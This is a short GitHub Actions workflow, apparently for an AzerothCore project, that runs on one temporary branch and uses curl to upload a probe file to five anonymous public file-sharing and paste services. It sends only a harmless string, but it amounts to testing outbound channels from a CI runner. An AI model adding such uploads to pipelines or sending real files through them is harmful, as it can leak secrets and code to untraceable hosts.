name: Temporary AzerothCore transport probe

on:
  push:
    branches:
      - 'tmp/acore-bootstrap-20260928'

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Probe temporary transports
        run: |
          set -u
          printf 'azerothcore-external-transport-probe\n' > probe.txt
          try() { name="$1"; shift; echo "=== $name ==="; timeout 30 "$@" 2>&1 || true; echo; }
          try litterbox curl -fsS -F reqtype=fileupload -F time=1h -F fileToUpload=@probe.txt https://litterbox.catbox.moe/resources/internals/api.php
          try catbox curl -fsS -F reqtype=fileupload -F fileToUpload=@probe.txt https://catbox.moe/user/api.php
          try transfer curl -fsS --upload-file probe.txt https://transfer.sh/acore-probe.txt
          try bashupload curl -fsS -T probe.txt https://bashupload.com/acore-probe.txt
          try pasters curl -fsS --data-binary @probe.txt https://paste.rs
